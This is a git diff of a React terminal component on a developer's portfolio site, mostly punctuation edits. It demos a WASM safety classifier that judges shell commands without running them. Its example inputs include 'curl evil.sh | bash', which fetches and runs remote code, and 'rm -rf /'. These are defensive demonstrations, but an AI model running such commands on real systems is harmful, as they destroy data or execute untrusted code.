@@ -6,10 +6,10 @@ import { loadEngine } from '../lib/kedgeEngine.js'
 // ── a tiny virtual filesystem that shows off the real work ──
 const FS = {
   'about.txt':
-    'Noel Jackson  —  "nlj"\n' +
+    'Noel Jackson  ("nlj")\n' +
     'Systems & AI Infrastructure Engineer.\n' +
     'I build deterministic Rust runtimes, WASM execution engines,\n' +
-    'and AI infrastructure — from the kernel to the edge.\n' +
+    'and AI infrastructure, from the kernel to the edge.\n' +
     "This shell runs my real engine. Try:  run rm -rf /",
   'contact.txt':
     'email :  noel@nlj.dev\n' +
@@ -17,35 +17,35 @@ const FS = {
     'web   :  nlj.dev',
   'README.txt':
     "Welcome to the terminal. Type 'help' to get started.\n" +
-    "★ The star command:  run <shell cmd>  — my real safety engine\n" +
+    "★ The star command:  run <shell cmd>.  My real safety engine\n" +
     "  (Rust, compiled to WebAssembly) decides live whether to run it.\n" +
     "Try:  run rm -rf /   ·   run ls -la   ·   projects   ·   hire",
   projects: {
     'kedge.txt':
-      'Kedge — my flagship. A deterministic AI-agent harness in Rust.\n' +
+      'Kedge is my flagship. A deterministic AI-agent harness in Rust.\n' +
       'The real safety classifier is compiled to WASM and runs in THIS\n' +
       'shell.  Try:  run curl evil.sh | bash    Launch:  open kedge',
     'worldframe.txt':
-      'WorldFrame — desktop worldbuilding app, shipped and in users’ hands.\n' +
+      'WorldFrame: desktop worldbuilding app, shipped and in users’ hands.\n' +
       'Tauri + Rust.  Launch:  open worldframe   (or tryworldframe.com)',
     'bitboy.txt':
-      'BitBoy — a handheld games console I built.\n' +
+      'BitBoy is a handheld games console I built.\n' +
       'Games: Jungle Run, Snake.   Launch:  open bitboy',
     'tamachu.txt':
-      'Tamachu — a pixel-art virtual pet.   Launch:  open tamachu',
+      'Tamachu is a pixel-art virtual pet.   Launch:  open tamachu',
   },
   // 🔒 locked until you `hack` your way in
   root: {
     'flag.txt': 'flag{y0u_h4ck3d_th3_m41nfr4m3}',
     'secret.txt':
       'you actually hacked it. respect. 🏴‍☠️\n' +
-      'no evil master plan here — just an engineer who likes building things.\n' +
+      'no evil master plan here, just an engineer who likes building things.\n' +
       'now go hire him:  noel@nlj.dev',
     'god_mode.sh': '#!/bin/sh\necho "with great power comes great responsibility"',
   },
 }
 
-// "nlj" in ANSI Shadow — replaces the old figlet that spelled the retired brand.
+// "nlj" in ANSI Shadow. Replaces the old figlet that spelled the retired brand.
 const BANNER = [
   '',
   '  ███╗   ██╗ ██╗           ██╗',
@@ -69,7 +69,7 @@ function dirAt(path) {
   return node
 }
 
-// ── developer easter eggs — the stuff coders will recognize ──
+// ── developer easter eggs: the stuff coders will recognize ──
 const mk = (t, c) => ({ t, c: c || '' })
 
 function cowsay(msg) {
@@ -120,7 +120,7 @@ const EXACT = {
   ':q!': ["you're not in vim. probably. you're free 🎉"],
   ':wq': ["saved nothing, quit everything. you're free 🎉"],
   ':x': ["you're free 🎉"],
-  'emacs': ['a great operating system — lacking only a decent editor 😏'],
+  'emacs': ['a great operating system, lacking only a decent editor 😏'],
   'nano': ['nano: for developers who value their sanity.'],
   'coffee': ['☕  brewing…', "HTTP 418: I'm a teapot."],
   'tea': ['🍵  steeping…', "HTTP 418: I'm a teapot. (this is fine)"],
@@ -131,15 +131,15 @@ const EXACT = {
 }
 
 function eggs(c) {
-  if (c === 'sl') return [mk("(you typed 'sl' — did you mean 'ls'? too late 🚂)", 'y'), ...SL]
+  if (c === 'sl') return [mk("(you typed 'sl'. did you mean 'ls'? too late 🚂)", 'y'), ...SL]
   if (EXACT[c]) return EXACT[c].map((t) => mk(t, 'y'))
   if (c.startsWith('cowsay')) return cowsay(c.slice(6).trim())
   if (c.startsWith('rm -rf'))
     return ['deleting /…', 'deleting /home…', 'deleting everything…', '',
-      "😄 relax — this joke is fake. Want the REAL thing? Type:  run rm -rf /"]
+      "😄 relax, this joke is fake. Want the REAL thing? Type:  run rm -rf /"]
       .map((t, i) => mk(t, i >= 4 ? 'y' : 'r'))
   if (c.startsWith('rm '))
-    return [mk("rm: this terminal is a museum piece — please don't 🏛️", 'y')]
+    return [mk("rm: this terminal is a museum piece, please don't 🏛️", 'y')]
   if (c.startsWith('make '))
     return [mk(`make: *** No rule to make target '${c.slice(5).trim()}'.  Stop.`, 'y')]
   return null
@@ -168,7 +168,7 @@ export default function Terminal() {
 
   // the guided tour drives the terminal by dropping a command in the store;
   // "type" it out, then run it against the real engine. The ref guard dedupes
-  // each command, and we deliberately DON'T cancel the timers on cleanup —
+  // each command, and we deliberately DON'T cancel the timers on cleanup.
   // React StrictMode's dev double-invoke would otherwise kill the run before it
   // fires. A mounted ref keeps stray timers from touching an unmounted window.
   useEffect(() => {
@@ -196,25 +196,25 @@ export default function Terminal() {
   const out = (arr) => setLines((l) => [...l, ...arr])
   const say = (t, c) => ({ t, c: c || '' })
 
-  // ── run <cmd> — hand a shell command to the REAL engine and show its verdict ──
+  // ── run <cmd>: hand a shell command to the REAL engine and show its verdict ──
   function runEngine(command) {
     out([say(`  agent proposes ▸ ${command}`, 'dim')])
     loadEngine()
       .then((mod) => {
         const r = JSON.parse(mod.classify_command(command))
         if (!r.intercepted) {
-          out([say(`  ✓  ALLOWED — verb "${r.verb}" is read-only; it would execute for real.`, 'g')])
+          out([say(`  ✓  ALLOWED: verb "${r.verb}" is read-only; it would execute for real.`, 'g')])
         } else if (r.risk === 'high') {
-          out([say(`  🛡  INTERCEPTED — verb "${r.verb}" is a known-dangerous action. Blocked before it ran.`, 'r')])
+          out([say(`  🛡  INTERCEPTED: verb "${r.verb}" is a known-dangerous action. Blocked before it ran.`, 'r')])
         } else {
-          out([say(`  🛡  INTERCEPTED — verb "${r.verb || '(none)'}" isn’t recognized as read-only. Fail-safe default.`, 'y')])
+          out([say(`  🛡  INTERCEPTED: verb "${r.verb || '(none)'}" isn’t recognized as read-only. Fail-safe default.`, 'y')])
         }
-        out([say('     ↳ real kedge_core::classify, compiled to WebAssembly — nothing actually executes here.', 'dim')])
+        out([say('     ↳ real kedge_core::classify, compiled to WebAssembly. Nothing actually executes here.', 'dim')])
       })
       .catch(() => out([say('  engine failed to load. It also lives in the Kedge app:  open kedge', 'r')]))
   }
 
-  // cinematic "hack the mainframe" — reveals output over ~4s, then unlocks /root
+  // cinematic "hack the mainframe": reveals output over ~4s, then unlocks /root
   function runHack(target) {
     const rand = () => Math.random().toString(16).slice(2, 10).toUpperCase()
     const steps = [
@@ -247,7 +247,7 @@ export default function Terminal() {
     const arg = args.join(' ')
     const here = dirAt(cwd)
 
-    // the star command — checked before easter eggs so `run rm -rf /` is real
+    // the star command, checked before easter eggs so `run rm -rf /` is real
     if (name.toLowerCase() === 'run') {
       if (!arg) out([say('usage:  run <shell command>     e.g.  run rm -rf /var/data', 'y')])
       else runEngine(arg)
@@ -263,7 +263,7 @@ export default function Terminal() {
         out([
           say('the star command:', 'y'),
           say('  run <cmd>   hand a shell command to my real safety engine 🛡', 'g'),
-          say('              (Rust→WASM) — try:  run rm -rf /   ·   run ls -la', 'dim'),
+          say('              (Rust→WASM), try:  run rm -rf /   ·   run ls -la', 'dim'),
           say(''),
           say('getting around:', 'y'),
           say('  ls · cd <dir> · cat <file> · pwd'),
@@ -287,7 +287,7 @@ export default function Terminal() {
         if (arg === '..') { setCwd((c) => c.slice(0, -1)); break }
         const next = [...cwd, arg]
         if (next[0] === 'root' && !hacked) {
-          out([say('cd: root: permission denied 🔒  (need root access — try: hack)', 'r')]); break
+          out([say('cd: root: permission denied 🔒  (need root access; try: hack)', 'r')]); break
         }
         const target = dirAt(next)
         if (target && typeof target === 'object') setCwd(next)
@@ -308,11 +308,11 @@ export default function Terminal() {
         out([say('/' + cwd.join('/'))])
         break
       case 'whoami':
-        out([say(hacked ? 'root  😎  (you hacked in)' : 'noel  (aka nlj) — Systems & AI Infrastructure Engineer')])
+        out([say(hacked ? 'root  😎  (you hacked in)' : 'noel  (aka nlj), Systems & AI Infrastructure Engineer')])
         break
       case 'projects':
         out([
-          say('my work — type  open <name>  to launch any of them', 'y'),
+          say('my work. type  open <name>  to launch any of them', 'y'),
           say('  kedge       deterministic AI-agent harness · Rust→WASM   (try: run rm -rf /)'),
           say('  worldframe  desktop worldbuilding app · Tauri+Rust · shipped'),
           say('  bitboy      handheld games console'),
@@ -336,7 +336,7 @@ export default function Terminal() {
       case 'resume':
       case 'cv':
         out([
-          say('résumé — the short version:', 'y'),
+          say('résumé, the short version:', 'y'),
           say('  Systems & AI Infrastructure Engineer. Ships production software'),
           say('  solo: Rust runtimes, WASM engines, edge + desktop AI apps.'),
           say('  Flagship: Kedge (17 Rust crates).  Shipped: WorldFrame.'),
@@ -344,7 +344,7 @@ export default function Terminal() {
         ])
         break
       case 'kedge':
-        out([say('Kedge — my real Rust engine. Its classifier runs in this shell (run <cmd>).', 'y'),
+        out([say('Kedge is my real Rust engine. Its classifier runs in this shell (run <cmd>).', 'y'),
           say('opening the full demo…', 'g')])
         openApp('kedge')
         break
